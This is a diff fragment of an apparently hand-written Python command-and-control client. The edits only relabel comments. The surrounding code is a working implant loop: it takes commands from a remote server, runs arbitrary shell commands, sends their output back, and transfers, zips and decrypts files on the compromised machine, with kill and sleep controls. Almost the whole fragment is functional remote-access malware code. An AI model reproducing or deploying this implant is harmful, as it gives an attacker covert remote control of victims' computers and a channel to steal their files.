@@ -66,11 +66,11 @@ while True:
         else:
             post_to_server(getcwd(), CWD_RESPONSE) # encode of getcwd needed
 
-    elif not cmd.startswith(C2Commands.CLS.value):
+    elif not cmd.startswith(C2Commands.CLS.value): # client ...
         cmd_output = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
         post_to_server(cmd_output.stdout.decode())
 
-    elif cmd.startswith(C2Commands.CLS_DWN.value):
+    elif cmd.startswith(C2Commands.CLS_DWN.value): # client download
         filepath = get_filename(cmd)
         if filepath is None: #IndexError / start new iteration
             continue
@@ -86,7 +86,7 @@ while True:
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to write {filename} to disk on {client}.\n")
 
-    elif cmd.startswith(C2Commands.CLS_UP.value):
+    elif cmd.startswith(C2Commands.CLS_UP.value): # client upload
         filepath = get_filename(cmd)
         if filepath is None: #IndexError / start new iteration
             continue
@@ -99,7 +99,7 @@ while True:
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on {client}.\n")
         
-    elif cmd.startswith(C2Commands.CLS_ZIP.value):
+    elif cmd.startswith(C2Commands.CLS_ZIP.value): # client zip
         filepath = get_filename(cmd)
         if filepath is None: #IndexError / start new iteration
             continue
@@ -118,7 +118,7 @@ while True:
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on {client}.\n")
 
-    elif cmd.startswith(C2Commands.CLS_UZIP.value):
+    elif cmd.startswith(C2Commands.CLS_UZIP.value): # client unzip
         filepath = get_filename(cmd)
         if filepath is None: #IndexError / start new iteration
             continue
@@ -130,11 +130,11 @@ while True:
                 post_to_server(f"{filepath} is now unzip and decrypted on the client.\n")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"{filepath} was not found on the client.\n")
-    elif cmd.startswith(C2Commands.CLS_KLL.value): # kill command
+    elif cmd.startswith(C2Commands.CLS_KLL.value): # client kill
         post_to_server(f"{client} has been killed.\n")
         exit()
 
-    elif cmd.startswith(C2Commands.CLS_SLP.value): # sleep command
+    elif cmd.startswith(C2Commands.CLS_SLP.value): # client sleep
         try:
             delay = float(cmd.split()[2])
             if delay < 0:
